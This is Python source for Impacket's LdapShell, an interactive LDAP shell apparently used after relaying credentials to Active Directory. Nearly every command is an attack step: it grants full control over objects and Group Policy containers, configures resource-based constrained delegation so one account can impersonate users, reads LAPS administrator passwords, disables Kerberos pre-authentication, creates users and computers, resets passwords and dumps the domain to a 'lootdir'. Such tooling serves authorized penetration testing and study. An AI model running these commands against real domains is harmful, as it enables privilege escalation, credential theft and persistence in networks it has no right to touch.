# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Mini shell using some of the LDAP functionalities of the library
#
# Author:
#   Mathieu Gascon-Lefebvre (@mlefebvre)
#
import re
import string
import sys
import cmd
import random
import ldap3
from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
from ldap3.utils.conv import escape_filter_chars
from six import PY2
import shlex
from impacket import LOG
from ldap3.protocol.microsoft import security_descriptor_control
from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
from impacket.ldap import ldaptypes


class LdapShell(cmd.Cmd):
    LDAP_MATCHING_RULE_IN_CHAIN = "1.2.840.113556.1.4.1941"

    def __init__(self, tcp_shell, domain_dumper, client):
        cmd.Cmd.__init__(self, stdin=tcp_shell.stdin, stdout=tcp_shell.stdout)

        if PY2:
            # switch to unicode.
            reload(sys) # noqa: F821 pylint:disable=undefined-variable
            sys.setdefaultencoding('utf8')

        sys.stdout = tcp_shell.stdout
        sys.stdin = tcp_shell.stdin
        sys.stderr = tcp_shell.stdout
        self.use_rawinput = False
        self.shell = tcp_shell

        self.prompt = '\n# '
        self.tid = None
        self.intro = 'Type help for list of commands'
        self.loggedIn = True
        self.last_output = None
        self.completion = []
        self.client = client
        self.domain_dumper = domain_dumper

    def emptyline(self):
        pass

    def onecmd(self, s):
        ret_val = False
        try:
            ret_val = cmd.Cmd.onecmd(self, s)
        except Exception as e:
            print(e)
            LOG.error(e)
            LOG.debug('Exception info', exc_info=True)

        return ret_val

    def create_empty_sd(self):
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd['Revision'] = b'\x01'
        sd['Sbz1'] = b'\x00'
        sd['Control'] = 32772
        sd['OwnerSid'] = ldaptypes.LDAP_SID()
        # BUILTIN\Administrators
        sd['OwnerSid'].fromCanonical('S-1-5-32-544')
        sd['GroupSid'] = b''
        sd['Sacl'] = b''
        acl = ldaptypes.ACL()
        acl['AclRevision'] = 4
        acl['Sbz1'] = 0
        acl['Sbz2'] = 0
        acl.aces = []
        sd['Dacl'] = acl
        return sd

    def create_allow_ace(self, sid):
        nace = ldaptypes.ACE()
        nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
        nace['AceFlags'] = 0x00
        acedata = ldaptypes.ACCESS_ALLOWED_ACE()
        acedata['Mask'] = ldaptypes.ACCESS_MASK()
        acedata['Mask']['Mask'] = 983551 # Full control
        acedata['Sid'] = ldaptypes.LDAP_SID()
        acedata['Sid'].fromCanonical(sid)
        nace['Ace'] = acedata
        return nace

    def do_write_gpo_dacl(self, line):
        args = shlex.split(line)
        print ("Adding %s to GPO with GUID %s" % (args[0], args[1]))
        if len(args) != 2:
            raise Exception("A samaccountname and GPO sid are required.")

        tgtUser = args[0]
        gposid = args[1]
        self.client.search(self.domain_dumper.root, '(&(objectclass=person)(sAMAccountName=%s))' % tgtUser, attributes=['objectSid'])
        if len( self.client.entries) <= 0:
            raise Exception("Didnt find the given user")

        user = self.client.entries[0]

        controls = security_descriptor_control(sdflags=0x04)
        self.client.search(self.domain_dumper.root, '(&(objectclass=groupPolicyContainer)(name=%s))' % gposid, attributes=['objectSid','nTSecurityDescriptor'], controls=controls)

        if len( self.client.entries) <= 0:
            raise Exception("Didnt find the given gpo")
        gpo = self.client.entries[0]

        secDescData = gpo['nTSecurityDescriptor'].raw_values[0]
        secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
        newace = self.create_allow_ace(str(user['objectSid']))
        secDesc['Dacl']['Data'].append(newace)
        data = secDesc.getData()

        self.client.modify(gpo.entry_dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
        if self.client.result["result"] == 0:
            print('LDAP server claims to have taken the secdescriptor. Have fun')
        else:
            raise Exception("Something wasnt right: %s" %str(self.client.result['description']))

    def do_add_computer(self, line):
        args = shlex.split(line)

        if not self.client.server.ssl:
            print("Error adding a new computer with LDAP requires LDAPS.")

        if len(args) != 1 and len(args) != 2:
            raise Exception("Error expected a computer name and an optional password argument.")

        computer_name = args[0]
        if not computer_name.endswith('$'):
            computer_name += '$'

        print("Attempting to add a new computer with the name: %s" % computer_name)

        password = ""
        if len(args) == 1:
            password = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
        else:
            password = args[1]

        domain_dn = self.domain_dumper.root
        domain = re.sub(',DC=', '.', domain_dn[domain_dn.find('DC='):], flags=re.I)[3:]

        print("Inferred Domain DN: %s" % domain_dn)
        print("Inferred Domain Name: %s" % domain)

        computer_hostname = computer_name[:-1] # Remove $ sign
        computer_dn = "CN=%s,CN=Computers,%s" % (computer_hostname, self.domain_dumper.root)
        print("New Computer DN: %s" % computer_dn)

        spns = [
            'HOST/%s' % computer_hostname,
            'HOST/%s.%s' % (computer_hostname, domain),
            'RestrictedKrbHost/%s' % computer_hostname,
            'RestrictedKrbHost/%s.%s' % (computer_hostname, domain),
        ]
        ucd = {
            'dnsHostName': '%s.%s' % (computer_hostname, domain),
            'userAccountControl': 4096,
            'servicePrincipalName': spns,
            'sAMAccountName': computer_name,
            'unicodePwd': '"{}"'.format(password).encode('utf-16-le')
        }

        res = self.client.add(computer_dn, ['top','person','organizationalPerson','user','computer'], ucd)

        if not res:
            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM: 
                print("Failed to add a new computer. The server denied the operation.")
            else:
                print('Failed to add a new computer: %s' % str(self.client.result))
        else:
            print('Adding new computer with username: %s and password: %s result: OK' % (computer_name, password))

    def do_add_user(self, line):
        args = shlex.split(line)
        if len(args) == 0:
            raise Exception("A username is required.")

        new_user = args[0]
        if len(args) == 1:
            parent_dn = 'CN=Users,%s' % self.domain_dumper.root
        else:
            parent_dn = args[1]

        new_password = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))

        new_user_dn = 'CN=%s,%s' % (new_user, parent_dn)
        ucd = {
            'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % self.domain_dumper.root,
            'distinguishedName': new_user_dn,
            'cn': new_user,
            'sn': new_user,
            'givenName': new_user,
            'displayName': new_user,
            'name': new_user,
            'userAccountControl': 512,
            'accountExpires': '0',
            'sAMAccountName': new_user,
            'unicodePwd': '"{}"'.format(new_password).encode('utf-16-le')
        }

        print('Attempting to create user in: %s', parent_dn)
        res = self.client.add(new_user_dn, ['top', 'person', 'organizationalPerson', 'user'], ucd)
        if not res:
            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
                raise Exception('Failed to add a new user. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing user.')
            else:
                raise Exception('Failed to add a new user: %s' % str(self.client.result['description']))
        else:
            print('Adding new user with username: %s and password: %s result: OK' % (new_user, new_password))

    def do_add_user_to_group(self, line):
        user_name, group_name = shlex.split(line)

        user_dn = self.get_dn(user_name)
        if not user_dn:
            raise Exception("User not found in LDAP: %s" % user_name)

        group_dn = self.get_dn(group_name)
        if not group_dn:
            raise Exception("Group not found in LDAP: %s" % group_name)

        user_name = user_dn.split(',')[0][3:]
        group_name = group_dn.split(',')[0][3:]

        res = self.client.modify(group_dn, {'member': [(ldap3.MODIFY_ADD, [user_dn])]})
        if res:
            print('Adding user: %s to group %s result: OK' % (user_name, group_name))
        else:
            raise Exception('Failed to add user to %s group: %s' % (group_name, str(self.client.result['description'])))

    def do_change_password(self, line):
        args = shlex.split(line)

        if len(args) != 1 and len(args) != 2:
            raise Exception("Error expected a username and an optional password argument. Instead %d arguments were provided" % len(args))

        user_dn = self.get_dn(args[0])
        print("Got User DN: " + user_dn)

        password = ""
        if len(args) == 1:
            password = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
        else:
            password = args[1]

        print("Attempting to set new password of: %s" % password)
        success = self.client.extend.microsoft.modify_password(user_dn, password)

        if self.client.result['result'] == 0:
            print('Password changed successfully!')
        else:
            if self.client.result['result'] == 50:
                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
            elif self.client.result['result'] == 19:
                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
            else:
                raise Exception('The server returned an error: %s', self.client.result['message'])

    def do_clear_rbcd(self, computer_name):

        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(computer_name), attributes=['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        if success is False or len(self.client.entries) != 1:
            raise Exception("Error expected only one search result got %d results", len(self.client.entries))

        target = self.client.entries[0]
        target_sid = target["objectsid"].value
        print("Found Target DN: %s" % target.entry_dn)
        print("Target SID: %s\n" % target_sid)

        sd = self.create_empty_sd()

        self.client.modify(target.entry_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
        if self.client.result['result'] == 0:
            print('Delegation rights cleared successfully!')
        else:
            if self.client.result['result'] == 50:
                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
            elif self.client.result['result'] == 19:
                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
            else:
                raise Exception('The server returned an error: %s', self.client.result['message'])

    def do_dump(self, line):
        print('Dumping domain info...')
        self.stdout.flush()
        self.domain_dumper.domainDump()
        print('Domain info dumped into lootdir!')

    def do_disable_account(self, username):
        self.toggle_account_enable_disable(username, False)

    def do_enable_account(self, username):
        self.toggle_account_enable_disable(username, True)

    def toggle_account_enable_disable(self, user_name, enable):
        UF_ACCOUNT_DISABLE = 2
        self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(user_name), attributes=['objectSid', 'userAccountControl'])

        if len(self.client.entries) != 1:
            raise Exception("Error expected only one search result got %d results", len(self.client.entries))

        user_dn = self.client.entries[0].entry_dn
        if not user_dn:
            raise Exception("User not found in LDAP: %s" % user_name)

        entry = self.client.entries[0]
        userAccountControl = entry["userAccountControl"].value

        print("Original userAccountControl: %d" % userAccountControl) 

        if enable:
            userAccountControl = userAccountControl & ~UF_ACCOUNT_DISABLE
        else:
            userAccountControl = userAccountControl | UF_ACCOUNT_DISABLE

        self.client.modify(user_dn, {'userAccountControl':(ldap3.MODIFY_REPLACE, [userAccountControl])})

        if self.client.result['result'] == 0:
            print("Updated userAccountControl attribute successfully")
        else:
            if self.client.result['result'] == 50:
                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
            elif self.client.result['result'] == 19:
                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
            else:
                raise Exception('The server returned an error: %s', self.client.result['message'])

    def do_search(self, line):
        arguments = shlex.split(line)
        if len(arguments) == 0:
            raise Exception("A query is required.")

        filter_attributes = ['name', 'distinguishedName', 'sAMAccountName']
        attributes = filter_attributes[:]
        attributes.append('objectSid')
        for argument in arguments[1:]:
            attributes.append(argument)

        search_query = "".join("(%s=*%s*)" % (attribute, escape_filter_chars(arguments[0])) for attribute in filter_attributes)
        self.search('(|%s)' % search_query, *attributes)

    def do_set_dontreqpreauth(self, line):
        UF_DONT_REQUIRE_PREAUTH = 4194304

        args = shlex.split(line)
        if len(args) != 2:
            raise Exception("Username (SAMAccountName) and true/false flag required (e.g. jsmith true).")

        user_name = args[0]
        flag_str = args[1]
        flag = False

        if flag_str.lower() == "true":
            flag = True
        elif flag_str.lower() == "false":
            flag = False
        else:
            raise Exception("The specified flag must be either true or false")

        self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(user_name), attributes=['objectSid', 'userAccountControl'])
        if len(self.client.entries) != 1:
            raise Exception("Error expected only one search result got %d results", len(self.client.entries))

        user_dn = self.client.entries[0].entry_dn
        if not user_dn:
            raise Exception("User not found in LDAP: %s" % user_name)

        entry = self.client.entries[0]
        userAccountControl = entry["userAccountControl"].value
        print("Original userAccountControl: %d" % userAccountControl) 

        if flag:
            userAccountControl = userAccountControl | UF_DONT_REQUIRE_PREAUTH
        else:
            userAccountControl = userAccountControl & ~UF_DONT_REQUIRE_PREAUTH

        print("Updated userAccountControl: %d" % userAccountControl) 
        self.client.modify(user_dn, {'userAccountControl':(ldap3.MODIFY_REPLACE, [userAccountControl])})

        if self.client.result['result'] == 0:
            print("Updated userAccountControl attribute successfully")
        else:
            if self.client.result['result'] == 50:
                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
            elif self.client.result['result'] == 19:
                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
            else:
                raise Exception('The server returned an error: %s', self.client.result['message'])

    def do_get_user_groups(self, user_name):
        user_dn = self.get_dn(user_name)
        if not user_dn:
            raise Exception("User not found in LDAP: %s" % user_name)

        self.search('(member:%s:=%s)' % (LdapShell.LDAP_MATCHING_RULE_IN_CHAIN, escape_filter_chars(user_dn)))

    def do_get_group_users(self, group_name):
        group_dn = self.get_dn(group_name)
        if not group_dn:
            raise Exception("Group not found in LDAP: %s" % group_name)

        self.search('(memberof:%s:=%s)' % (LdapShell.LDAP_MATCHING_RULE_IN_CHAIN, escape_filter_chars(group_dn)), "sAMAccountName", "name")

    def do_get_laps_password(self, computer_name):

        self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(computer_name), attributes=['ms-MCS-AdmPwd'])
        if len(self.client.entries) != 1:
            raise Exception("Error expected only one search result got %d results", len(self.client.entries))

        computer = self.client.entries[0]
        print("Found Computer DN: %s" % computer.entry_dn)

        password = computer["ms-MCS-AdmPwd"].value

        if password is not None:
            print("LAPS Password: %s" % password)
        else:
            print("Unable to Read LAPS Password for Computer")

    def do_grant_control(self, line):
        args = shlex.split(line)

        if len(args) != 1 and len(args) != 2:
            raise Exception("Error expecting target and grantee names for RBCD attack. Recieved %d arguments instead." % len(args))

        controls = security_descriptor_control(sdflags=0x04)

        target_name = args[0]
        grantee_name = args[1]

        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(target_name), attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)
        if success is False or len(self.client.entries) != 1:
            raise Exception("Error expected only one search result got %d results", len(self.client.entries))

        target = self.client.entries[0]
        target_sid = target["objectSid"].value
        print("Found Target DN: %s" % target.entry_dn)
        print("Target SID: %s\n" % target_sid)

        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(grantee_name), attributes=['objectSid'])
        if success is False or len(self.client.entries) != 1:
            raise Exception("Error expected only one search result got %d results", len(self.client.entries))

        grantee = self.client.entries[0]
        grantee_sid = grantee["objectSid"].value
        print("Found Grantee DN: %s" % grantee.entry_dn)
        print("Grantee SID: %s" % grantee_sid)

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['nTSecurityDescriptor'].raw_values[0])
        except IndexError:
            sd = self.create_empty_sd()

        sd['Dacl'].aces.append(self.create_allow_ace(grantee_sid))
        self.client.modify(target.entry_dn, {'nTSecurityDescriptor':[ldap3.MODIFY_REPLACE, [sd.getData()]]}, controls=controls)

        if self.client.result['result'] == 0:
            print('DACL modified successfully!')
            print('%s now has control of %s' % (grantee_name, target_name))
        else:
            if self.client.result['result'] == 50:
                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
            elif self.client.result['result'] == 19:
                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
            else:
                raise Exception('The server returned an error: %s', self.client.result['message'])

    def do_set_rbcd(self, line):
        args = shlex.split(line)

        if len(args) != 1 and len(args) != 2:
            raise Exception("Error expecting target and grantee names for RBCD attack. Recieved %d arguments instead." % len(args))

        target_name = args[0]
        grantee_name = args[1]

        target_sid = args[0]
        grantee_sid = args[1]

        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(target_name), attributes=['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        if success is False or len(self.client.entries) != 1:
            raise Exception("Error expected only one search result got %d results", len(self.client.entries))

        target = self.client.entries[0]
        target_sid = target["objectSid"].value
        print("Found Target DN: %s" % target.entry_dn)
        print("Target SID: %s\n" % target_sid)

        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(grantee_name), attributes=['objectSid'])
        if success is False or len(self.client.entries) != 1:
            raise Exception("Error expected only one search result got %d results", len(self.client.entries))

        grantee = self.client.entries[0]
        grantee_sid = grantee["objectSid"].value
        print("Found Grantee DN: %s" % grantee.entry_dn)
        print("Grantee SID: %s" % grantee_sid)

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0])
            print('Currently allowed sids:')
            for ace in sd['Dacl'].aces:
                print('    %s' % ace['Ace']['Sid'].formatCanonical())

                if ace['Ace']['Sid'].formatCanonical() == grantee_sid:
                    print("Grantee is already permitted to perform delegation to the target host")
                    return

        except IndexError:
            sd = self.create_empty_sd()

        sd['Dacl'].aces.append(self.create_allow_ace(grantee_sid))
        self.client.modify(target.entry_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})

        if self.client.result['result'] == 0:
            print('Delegation rights modified successfully!')
            print('%s can now impersonate users on %s via S4U2Proxy' % (grantee_name, target_name))
        else:
            if self.client.result['result'] == 50:
                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
            elif self.client.result['result'] == 19:
                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
            else:
                raise Exception('The server returned an error: %s', self.client.result['message'])

    def search(self, query, *attributes):
        self.client.search(self.domain_dumper.root, query, attributes=attributes)
        for entry in self.client.entries:
            print(entry.entry_dn)
            for attribute in attributes:
                value = entry[attribute].value
                if value:
                    print("%s: %s" % (attribute, entry[attribute].value))
            if any(attributes):
                print("---")

    def get_dn(self, sam_name):
        if "," in sam_name:
            return sam_name

        try:
            self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(sam_name), attributes=['objectSid'])
            return self.client.entries[0].entry_dn
        except IndexError:
            return None

    def do_exit(self, line):
        if self.shell is not None:
            self.shell.close()
        return True

    def do_help(self, line):
        print("""
 add_computer computer [password] - Adds a new computer to the domain with the specified password. Requires LDAPS.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 exit - Terminates this session.""")

    def do_EOF(self, line):
        print('Bye!\n')
        return True
